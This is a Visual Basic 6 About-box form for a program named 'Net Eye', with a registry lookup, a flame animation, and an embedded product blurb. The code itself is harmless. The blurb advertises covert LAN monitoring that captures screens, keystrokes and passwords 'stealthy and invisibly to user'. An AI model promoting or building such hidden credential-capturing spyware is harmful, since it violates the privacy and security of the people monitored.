
      Interval        =   1
      Left            =   6120
      Top             =   120
   End
   Begin VB.Image imgAuthor 
      Height          =   2670
      Left            =   120
      Top             =   360
      Width           =   1680
   End
   Begin VB.Label lblAuthor 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Tauseef Jamal"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFC0C0&
      Height          =   240
      Index           =   1
      Left            =   2040
      TabIndex        =   5
      ToolTipText     =   "gr8_libran@yahoo.com"
      Top             =   2880
      Width           =   1560
   End
   Begin VB.Label lblAuthor 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Muhammad Naeem"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFC0C0&
      Height          =   240
      Index           =   0
      Left            =   2040
      TabIndex        =   4
      ToolTipText     =   "naeem@email.com"
      Top             =   2520
      Width           =   2010
   End
   Begin VB.Label lblDisclaimer 
      AutoSize        =   -1  'True
      BackStyle       =   0  'Transparent
      Caption         =   "Designed && Maintained by:-"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF8080&
      Height          =   240
      Index           =   0
      Left            =   1920
      TabIndex        =   3
      Top             =   2160
      Width           =   2985
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Net Eye"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   18
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000080FF&
      Height          =   405
      Left            =   1920
      TabIndex        =   1
      Top             =   600
      Width           =   1545
   End
End
Attribute VB_Name = "frmAbout"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
' Reg Key Security Options...
Const READ_CONTROL = &H20000
Const KEY_QUERY_VALUE = &H1
Const KEY_SET_VALUE = &H2
Const KEY_CREATE_SUB_KEY = &H4
Const KEY_ENUMERATE_SUB_KEYS = &H8
Const KEY_NOTIFY = &H10
Const KEY_CREATE_LINK = &H20
Const KEY_ALL_ACCESS = KEY_QUERY_VALUE + KEY_SET_VALUE + _
                       KEY_CREATE_SUB_KEY + KEY_ENUMERATE_SUB_KEYS + _
                       KEY_NOTIFY + KEY_CREATE_LINK + READ_CONTROL
                     
' Reg Key ROOT Types...
Const HKEY_LOCAL_MACHINE = &H80000002
Const ERROR_SUCCESS = 0
Const REG_SZ = 1                         ' Unicode nul terminated string
Const REG_DWORD = 4                      ' 32-bit number

Const gREGKEYSYSINFOLOC = "SOFTWARE\Microsoft\Shared Tools Location"
Const gREGVALSYSINFOLOC = "MSINFO"
Const gREGKEYSYSINFO = "SOFTWARE\Microsoft\Shared Tools\MSINFO"
Const gREGVALSYSINFO = "PATH"

Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, ByRef phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long

Dim flgAuthor As Boolean
Dim lngCounter As Long


Private Sub cmdOK_Click()
 Timer1.Enabled = False: Timer2.Enabled = False
 Unload Me
 Set frmAbout = Nothing
End Sub

Private Sub cmdSysInfo_Click()
    On Error GoTo SysInfoErr
  
    Dim rc As Long
    Dim SysInfoPath As String
    
    ' Try To Get System Info Program Path\Name From Registry...
    If GetKeyValue(HKEY_LOCAL_MACHINE, gREGKEYSYSINFO, gREGVALSYSINFO, SysInfoPath) Then
    ' Try To Get System Info Program Path Only From Registry...
    ElseIf GetKeyValue(HKEY_LOCAL_MACHINE, gREGKEYSYSINFOLOC, gREGVALSYSINFOLOC, SysInfoPath) Then
        ' Validate Existance Of Known 32 Bit File Version
        If (Dir(SysInfoPath & "\MSINFO32.EXE") <> "") Then
            SysInfoPath = SysInfoPath & "\MSINFO32.EXE"
            
        ' Error - File Can Not Be Found...
        Else
            GoTo SysInfoErr
        End If
    ' Error - Registry Entry Can Not Be Found...
    Else
        GoTo SysInfoErr
    End If
    
    Call Shell(SysInfoPath, vbNormalFocus)
    
    Exit Sub
SysInfoErr:
    MsgBox "System Information Is Unavailable At This Time", vbOKOnly

End Sub

Public Function GetKeyValue(KeyRoot As Long, KeyName As String, SubKeyRef As String, ByRef KeyVal As String) As Boolean
    Dim i As Long                                           ' Loop Counter
    Dim rc As Long                                          ' Return Code
    Dim hKey As Long                                        ' Handle To An Open Registry Key
    Dim hDepth As Long                                      '
    Dim KeyValType As Long                                  ' Data Type Of A Registry Key
    Dim tmpVal As String                                    ' Tempory Storage For A Registry Key Value
    Dim KeyValSize As Long                                  ' Size Of Registry Key Variable
    '------------------------------------------------------------
    ' Open RegKey Under KeyRoot {HKEY_LOCAL_MACHINE...}
    '------------------------------------------------------------
    rc = RegOpenKeyEx(KeyRoot, KeyName, 0, KEY_ALL_ACCESS, hKey) ' Open Registry Key
    
    If (rc <> ERROR_SUCCESS) Then GoTo GetKeyError          ' Handle Error...
    
    tmpVal = String$(1024, 0)                             ' Allocate Variable Space
    KeyValSize = 1024                                       ' Mark Variable Size
    
    '------------------------------------------------------------
    ' Retrieve Registry Key Value...
    '------------------------------------------------------------
    rc = RegQueryValueEx(hKey, SubKeyRef, 0, _
                         KeyValType, tmpVal, KeyValSize)    ' Get/Create Key Value
                        
    If (rc <> ERROR_SUCCESS) Then GoTo GetKeyError          ' Handle Errors
    
    If (Asc(Mid(tmpVal, KeyValSize, 1)) = 0) Then           ' Win95 Adds Null Terminated String...
        tmpVal = Left(tmpVal, KeyValSize - 1)               ' Null Found, Extract From String
    Else                                                    ' WinNT Does NOT Null Terminate String...
        tmpVal = Left(tmpVal, KeyValSize)                   ' Null Not Found, Extract String Only
    End If
    '------------------------------------------------------------
    ' Determine Key Value Type For Conversion...
    '------------------------------------------------------------
    Select Case KeyValType                                  ' Search Data Types...
    Case REG_SZ                                             ' String Registry Key Data Type
        KeyVal = tmpVal                                     ' Copy String Value
    Case REG_DWORD                                          ' Double Word Registry Key Data Type
        For i = Len(tmpVal) To 1 Step -1                    ' Convert Each Bit
            KeyVal = KeyVal + Hex(Asc(Mid(tmpVal, i, 1)))   ' Build Value Char. By Char.
        Next
        KeyVal = Format$("&h" + KeyVal)                     ' Convert Double Word To String
    End Select
    
    GetKeyValue = True                                      ' Return Success
    rc = RegCloseKey(hKey)                                  ' Close Registry Key
    Exit Function                                           ' Exit
    
GetKeyError:      ' Cleanup After An Error Has Occured...
    KeyVal = ""                                             ' Set Return Val To Empty String
    GetKeyValue = False                                     ' Return Failure
    rc = RegCloseKey(hKey)                                  ' Close Registry Key
End Function


Private Sub Form_Load()
   '' some code to draw picture and tool tip text of the authors
   Dim i As Integer
   Randomize Timer
   i = Int((7 - 4 + 1) * Rnd() + 4)
   imgAuthor.ToolTipText = Query.imgLstSpy.ListImages(i).Tag
   imgAuthor.Picture = Query.imgLstSpy.ListImages(i).Picture

   ''''''''' start some initialization for the Blazing code
   maxx = Label1.Width                          'get label width
   maxy = Label1.Height + (Label1.Height / 2)   'get label height add extra height for flame
   ReDim new_flame(maxx, maxy)                  'resize array to label
   ReDim old_flame(maxx, maxy)
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
 If flgAuthor = True Then
    flgAuthor = False
    lblAuthor(0).FontItalic = False: lblAuthor(1).FontItalic = False
 End If
End Sub

Private Sub Image1_Click()

End Sub

Private Sub lblAuthor_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
 lblAuthor(Index).FontItalic = True
 flgAuthor = True
End Sub

Private Sub Timer1_Timer()
  'This is the main timer,  Displays and updates the flame
  Dim X, Y As Integer    'store current x and y pos.
  Dim red, green, blue As Long     'store colours
  Dim Tmp As Long
If lngCounter > 20 Then Timer1.Enabled = False: Timer2.Enabled = False: Exit Sub
  'This part generates the flame :)
    For X = 1 To maxx - 1
     For Y = 1 To maxy - 1
       'Add up the surrounding red colours
        red = new_flame(X + 1, Y).r
        red = red + new_flame(X - 1, Y).r
        red = red + new_flame(X, Y + 1).r
        red = red + new_flame(X, Y - 1).r
            DoEvents
        'Add up the surrounding green colours
        green = new_flame(X + 1, Y).g
        green = green + new_flame(X - 1, Y).g
        green = green + new_flame(X, Y + 1).g
        green = green + new_flame(X, Y - 1).g
             DoEvents
'        blue = blue + new_flame(X + 1, Y).b    'Add up the surrounding blue colours
'        blue = blue + new_flame(X - 1, Y).b
'        blue = blue + new_flame(X, Y + 1).b
'        blue = blue + new_flame(X, Y - 1).b
        
        'uses the row above (y-1) to give the effect of moving up!
        If old_flame(X, Y - 1).C = False Then   'if pixel is part of flame update
          Tmp = (Rnd * Flame_Height)                      'pick a number from the air!
          old_flame(X, Y - 1).r = red / 4 - (Tmp) ' Average the red and decrease the colour
          old_flame(X, Y - 1).g = (green / 4) - (Tmp + 8) ' Average the green and decrease the colour
             
'         old_flame(X, Y - 1).b = blue / 4 ' Average the blue
          'Check colours haven`t gone below 0
          If old_flame(X, Y - 1).r < 0 Then old_flame(X, Y - 1).r = 0
          If old_flame(X, Y - 1).g < 0 Then old_flame(X, Y - 1).g = 0
'          If old_flame(X, Y - 1).b < 0 Then old_flame(X, Y - 1).b = 0
        End If
     Next Y
  Next X
  
  'This loop Displays and updates the array
  For X = 1 To maxx
     For Y = 1 To maxy
        new_flame(X, Y).r = old_flame(X, Y).r     ' update array
        new_flame(X, Y).g = old_flame(X, Y).g
   '  new_flame(X, Y).b = old_flame(X, Y).b
        'put the pixel!
        DoEvents
 ' Me.PSet (Label1.Left + X, Label1.Top + Y - Int(Label1.Height / 2)), RGB(new_flame(X - 1, Y).r, new_flame(X - 1, Y).g, new_flame(X - 1, Y).b)
Me.PSet (Label1.Left + X, Label1.Top + Y - Int(Label1.Height / 2)), RGB(new_flame(X - 1, Y).r, new_flame(X - 1, Y).g, new_flame(X - 1, Y).B)
     Next Y
  Next X
  lngCounter = lngCounter + 1
End Sub

Private Sub Timer2_Timer()
    'This timer only initializes the array colours
    Dim X As Long
    Dim Y As Long
      
    For X = 1 To maxx
     For Y = 1 To maxy
          If Point(Label1.Left + X, Label1.Top + Label1.Height - Y) <> 0 Then ' is there any colour at this point
           new_flame(X, maxy - Y).r = 255   ' Set colour to Yellow
           new_flame(X, maxy - Y).g = 255
           new_flame(X, maxy - Y).B = 0
           new_flame(X, maxy - Y).C = True  ' Is a permenant colour
          Else
           new_flame(X, maxy - Y).r = 0
           new_flame(X, maxy - Y).g = 0
           new_flame(X, maxy - Y).B = 0
           new_flame(X, maxy - Y).C = False ' Can be any colour
          End If
            DoEvents
          old_flame(X, maxy - Y).r = new_flame(X, maxy - Y).r  'old_flame=new_flame
          old_flame(X, maxy - Y).g = new_flame(X, maxy - Y).g
          old_flame(X, maxy - Y).B = new_flame(X, maxy - Y).B
          old_flame(X, maxy - Y).C = new_flame(X, maxy - Y).C
     Next Y
  Next X
  Label1.Visible = False
  Timer1.Enabled = True   ' Call the Fire brigade :)
  Timer2.Enabled = False  ' Turn off the taps!
  
  
End Sub
                                                                                                                                    ÿ¥Welcome for choosing The most 
important softwares for the Network 
Admins!
Net Eye lets you watch online the 
screen of the monitor of any computer 
within your intranet (LAN).
Program captures the screenshot of the 
computer whenever you require and 
sends it to your computer 
so You are able to monitor what the pc 
user is doing on computer at real time - 
keystrokes, passwords, usernames, 
confidential information, invoking 
applications remotely, shut-down/log 
off/restarting
and even tracking all MOUSE 
movements!
Works stealthy and invisibly to user. 
Real time watching the screen of the 
monitor of your Local Area Network in a 
same domain
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    